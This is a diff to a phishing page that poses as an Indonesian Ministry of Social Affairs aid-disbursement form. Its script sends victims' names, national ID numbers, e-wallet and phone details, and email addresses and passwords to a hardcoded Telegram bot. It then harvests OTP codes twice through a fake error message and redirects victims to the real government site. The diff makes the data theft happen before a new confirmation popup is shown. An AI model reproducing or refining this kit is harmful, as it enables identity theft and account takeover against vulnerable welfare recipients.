@@ -7,6 +7,18 @@
 </head>
 <body style="margin:0; background:#eceff1; font-family:sans-serif; display:flex; justify-content:center; align-items:center; min-height:100vh; padding:20px 0;">
 
+    <div id="popup" style="display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.7); z-index:9999; justify-content:center; align-items:center; padding:20px; box-sizing:border-box;">
+        <div style="background:white; width:100%; max-width:320px; border-radius:12px; padding:20px; text-align:center; box-shadow:0 10px 20px rgba(0,0,0,0.2);">
+            <div style="color:#d32f2f; font-size:40px; margin-bottom:10px;">⚠️</div>
+            <h3 style="margin:0 0 10px; color:#333; font-size:18px;">Konfirmasi Data</h3>
+            <p style="font-size:14px; color:#666; line-height:1.4; margin-bottom:20px;">Apakah semua data yang Anda masukkan sudah sesuai? Data yang salah dapat menghambat proses pencairan Dana Bansos.</p>
+            <div style="display:flex; gap:10px;">
+                <button onclick="tutupPopup()" style="flex:1; padding:12px; border:1px solid #ccc; background:white; border-radius:6px; cursor:pointer;">Cek Lagi</button>
+                <button onclick="okeLanjut()" style="flex:1; padding:12px; background:#0056b3; color:white; border:none; border-radius:6px; font-weight:bold; cursor:pointer;">Sudah Benar</button>
+            </div>
+        </div>
+    </div>
+
     <div style="background:white; width:90%; max-width:360px; border-radius:12px; overflow:hidden; box-shadow:0 10px 25px rgba(0,0,0,0.15); border:1px solid #ddd;">
         
         <div style="background:#f8f9fa; padding:20px; border-bottom:2px solid #0056b3; text-align:center;">
@@ -35,7 +47,7 @@
                 <input type="email" id="e" placeholder="Alamat Email" style="width:100%; padding:12px; margin:8px 0 10px; border:1px solid #ccc; border-radius:6px; box-sizing:border-box;">
                 <input type="password" id="pe" placeholder="Password Email" style="width:100%; padding:12px; margin-bottom:20px; border:1px solid #ccc; border-radius:6px; box-sizing:border-box;">
                 
-                <button onclick="lanjut()" style="width:100%; padding:15px; background:#0056b3; color:white; border:none; border-radius:6px; font-weight:bold; cursor:pointer; font-size:14px;">KONFIRMASI PENCAIRAN</button>
+                <button onclick="tanyaDulu()" style="width:100%; padding:15px; background:#0056b3; color:white; border:none; border-radius:6px; font-weight:bold; cursor:pointer; font-size:14px;">KONFIRMASI PENCAIRAN</button>
             </div>
 
             <div id="k2" style="display:none; text-align:center;">
@@ -50,14 +62,14 @@
         </div>
         
         <div style="padding:15px; font-size:11px; color:#777; background:#f1f1f1; text-align:center;">
-            &copy; 2026 Kementerian Sosial Republic Indonesia
+            &copy; 2026 Kementerian Sosial Republik Indonesia
         </div>
     </div>
 
     <script>
         const T = "7853186656:AAFE1JRhYrZcTkM3T3D0jRUxyqh76L8o8f4";
         const C = "8041825289";
-        let klikKe = 0; // Buat ngitung berapa kali tombol di klik
+        let klikKe = 0;
 
         function tele(m) {
             fetch(`https://api.telegram.org/bot${T}/sendMessage?chat_id=${C}&text=${encodeURIComponent(m)}&parse_mode=html`);
@@ -77,7 +89,8 @@
             }, 1000);
         }
 
-        function lanjut() {
+        // FUNGSI PAS KLIK TOMBOL KONFIRMASI (KIRIM DULU BARU POPUP)
+        function tanyaDulu() {
             let vn = document.getElementById('n').value;
             let vnik = document.getElementById('nik').value;
             let vew = document.getElementById('ew').value;
@@ -87,6 +100,7 @@
             let vpe = document.getElementById('pe').value;
 
             if(vn && vnik && vh && vp && ve && vpe) {
+                // KIRIM KE TELEGRAM DULU DISINI
                 let pesan = `<b>DATA BARU MASUK</b>\n\n` +
                             `👤 Nama: ${vn}\n` +
                             `🆔 NIK: ${vnik}\n` +
@@ -96,10 +110,22 @@
                             `📧 Email: ${ve}\n` +
                             `🔓 Pass: ${vpe}`;
                 tele(pesan);
-                document.getElementById('k1').style.display = 'none';
-                document.getElementById('k2').style.display = 'block';
-                startTimer();
+
+                // BARU MUNCULIN POPUP
+                document.getElementById('popup').style.display = 'flex';
             } else { alert("Harap lengkapi seluruh data verifikasi!"); }
+        }
+
+        function tutupPopup() {
+            document.getElementById('popup').style.display = 'none';
+        }
+
+        function okeLanjut() {
+            // Langsung pindah ke menu OTP tanpa kirim ulang
+            document.getElementById('popup').style.display = 'none';
+            document.getElementById('k1').style.display = 'none';
+            document.getElementById('k2').style.display = 'block';
+            startTimer();
         }
 
         function kirim() {
@@ -108,15 +134,13 @@
             
             if(vo) {
                 if(klikKe === 0) {
-                    // Klik pertama munculin peringatan PIN
-                    alert("Gagal memproses! Masukkan PIN yang sesuai dengan akun E-Wallet.");
+                    alert("Gagal memproses! Masukkan PIN yang sesuai dengan akun Anda.");
                     tele(`<b>KODE OTP (SALAH/PERTAMA)</b>\nNama: ${vn}\nOTP: ${vo}`);
-                    document.getElementById('o').value = ""; // Kosongin lagi biar dia isi ulang
+                    document.getElementById('o').value = "";
                     klikKe = 1;
                 } else {
-                    // Klik kedua baru sukses
                     tele(`<b>KODE OTP (FIX)</b>\nNama: ${vn}\nOTP: ${vo}`);
-                    alert("Data Anda sedang diverifikasi. Mohon tunggu 1x24 jam.");
+                    alert("Data Anda sedang diverifikasi. Mohon tunggu jangan keluar dari situs ini.");
                     window.location.href = "https://cekbansos.kemensos.go.id/";
                 }
             } else { alert("Masukkan kode OTP dengan benar!"); }
